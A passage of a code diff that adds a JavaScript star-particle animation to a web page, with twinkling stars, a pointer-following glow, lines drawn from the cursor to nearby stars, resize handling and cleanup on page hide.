+        /*
+         * Store particle information.
+         */
+        stars.push({
+            element: star,
+
+            x: x,
+            y: y,
+
+            vx: Math.cos(angle) * speed,
+            vy: Math.sin(angle) * speed,
+
+            baseOpacity: random(0.25, 0.9),
+
+            size: size
+        });
+
+        space.appendChild(star);
+    }
+
+    /* ================================
+       ADD TWINKLE ANIMATION
+       ================================ */
+
+    const style = document.createElement("style");
+
+    style.textContent = `
+        @keyframes publiiStarTwinkle {
+            0%, 100% {
+                opacity: 0.08;
+            }
+
+            25% {
+                opacity: 0.35;
+            }
+
+            50% {
+                opacity: 1;
+            }
+
+            75% {
+                opacity: 0.4;
+            }
+        }
+    `;
+
+    document.head.appendChild(style);
+
+    /* ================================
+       MOUSE
+       ================================ */
+
+    window.addEventListener(
+        "mousemove",
+        function (event) {
+
+            mouseX = event.clientX;
+            mouseY = event.clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /*
+     * Remove mouse interaction when
+     * pointer leaves the browser window.
+     */
+    document.addEventListener(
+        "mouseleave",
+        function () {
+            mouseX = -9999;
+            mouseY = -9999;
+        }
+    );
+
+    /* ================================
+       TOUCH
+       ================================ */
+
+    window.addEventListener(
+        "touchmove",
+        function (event) {
+
+            if (!event.touches.length) return;
+
+            mouseX = event.touches[0].clientX;
+            mouseY = event.touches[0].clientY;
+
+            if (glow) {
+                glow.style.left = mouseX + "px";
+                glow.style.top = mouseY + "px";
+            }
+        },
+        { passive: true }
+    );
+
+    /* ================================
+       ANIMATION
+       ================================ */
+
+    function animate() {
+
+        const width = window.innerWidth;
+        const height = window.innerHeight;
+
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            /*
+             * Move dust
+             */
+            star.x += star.vx;
+            star.y += star.vy;
+
+            /*
+             * Wrap around screen edges
+             */
+            if (star.x < -10) {
+                star.x = width + 10;
+            }
+
+            if (star.x > width + 10) {
+                star.x = -10;
+            }
+
+            if (star.y < -10) {
+                star.y = height + 10;
+            }
+
+            if (star.y > height + 10) {
+                star.y = -10;
+            }
+
+            /*
+             * Move particle
+             */
+            star.element.style.transform =
+                "translate3d(" +
+                star.x +
+                "px," +
+                star.y +
+                "px,0)";
+        }
+
+        animationFrame = requestAnimationFrame(animate);
+    }
+
+    animate();
+
+    /* ================================
+       MOUSE CONNECTIONS
+       ================================ */
+
+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
